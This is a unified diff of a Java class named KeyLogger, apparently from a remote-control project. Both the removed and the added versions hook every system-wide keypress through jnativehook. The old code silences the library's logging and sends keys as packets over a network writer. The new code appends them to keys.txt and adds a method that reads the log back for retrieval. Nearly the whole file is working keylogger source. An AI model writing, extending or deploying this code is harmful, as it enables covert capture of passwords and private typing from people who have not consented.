@@ -1,86 +1,86 @@
 package Control;
 
-import Ultils.MessageType;
-import Ultils.NetUtils;
-import Ultils.Packet;
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
-import java.io.PrintWriter;
-import java.util.Arrays;
-import java.util.logging.Level;
-import java.util.logging.LogManager;
-import java.util.logging.Logger;
+import java.io.*;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 
+
+/**
+ * @author dell
+ */
 public class KeyLogger implements NativeKeyListener {
 
-    private final PrintWriter pw;
+    private static final Path file = Paths.get("keys.txt");
+    private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
 
-    public KeyLogger(PrintWriter pw) throws NativeHookException {
-        GlobalScreen.registerNativeHook();
-        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
-        logger.setLevel(Level.OFF);
-        GlobalScreen.addNativeKeyListener(this);
-        this.pw = pw;
-        LogManager.getLogManager().reset();
-    }
+    public  void startKeyLogger(){
+        init();
 
-    @Override
-    public void nativeKeyPressed(NativeKeyEvent arg0) {
-        String text = NativeKeyEvent.getKeyText(arg0.getKeyCode());
-        boolean changed = false;
-        if (text.equals("Backspace")) {
-            text = "Back";
-            changed = true;
-        }
-        String chars = "abcdefghijklmnopqrstuvwxyz1234567890";
-        boolean contains = false;
         try {
-            for (char c : chars.toCharArray()) {
-                if ((c + "").equals( (arg0.getKeyChar() + "").toLowerCase())) {
-                    contains = true;
-                }
-            }
-            if (!contains) {
-                changed = true;
-            } // lolol
-        } catch (Exception e) {
-            changed = true;
-        }
-        if (text.equals("Space") || text.equals("Shift")) {
-            changed = true;
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException e) {
+            System.out.println("Cannot start keylogger");
         }
 
-        if (changed) {
-            try {
-                Packet packet = new Packet();
-                packet.action = MessageType.KEYLOGGER.getID();
-                packet.data = Arrays.asList(new String[] {text});
-                NetUtils.sendMessage(packet, pw);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }
+        GlobalScreen.addNativeKeyListener(new KeyLogger());
+        System.out.println("Keylogger started");
+    }
+    private static void init() {
+        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setUseParentHandlers(false);
     }
 
-    @Override
-    public void nativeKeyReleased(NativeKeyEvent arg0) {}
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
 
-    @Override
-    public void nativeKeyTyped(NativeKeyEvent arg0) {
-        String text = arg0.getKeyChar() + "";
-        if (!text.equals(" ")) {
-            try {
-                Packet packet = new Packet();
-                packet.action = MessageType.KEYLOGGER.getID();
-                packet.data = Arrays.asList(new String[] {text});
-                NetUtils.sendMessage(packet, pw);
-            } catch (Exception e) {
-                e.printStackTrace();
+        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
+                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
+
+            if (keyText.length() > 1) {
+                writer.print("[" + keyText + "]");
+            } else {
+                writer.print(keyText);
             }
+
+        } catch (IOException ex) {
+            System.out.println("Keylogger: Read/write failed");
         }
     }
+    public static String getKeyloggerData() {
+        StringBuilder result = new StringBuilder();
+        try {
+            FileInputStream fis = new FileInputStream(String.valueOf(file));
+            BufferedReader br = new BufferedReader (new InputStreamReader(fis));
 
+            String currentLine;
+            while ((currentLine = br.readLine()) != null){
+                result.append(currentLine).append("@@@&&&");
+            }
+            fis.close();
+            br.close();
+        } catch (FileNotFoundException fnf) {
+            System.out.println("Cannot find file: " + String.valueOf(file));
+        } catch (IOException ioe) {
+            System.out.println("Cannot load file");
+        }
+        return result.toString().replace("\n","@@@&&&");
+    }
+    public void nativeKeyReleased(NativeKeyEvent e) {
+    }
+
+    public void nativeKeyTyped(NativeKeyEvent e) {
+    }
+
+    public static void main(String[] args) {
+        System.out.println(getKeyloggerData());
+    }
 }
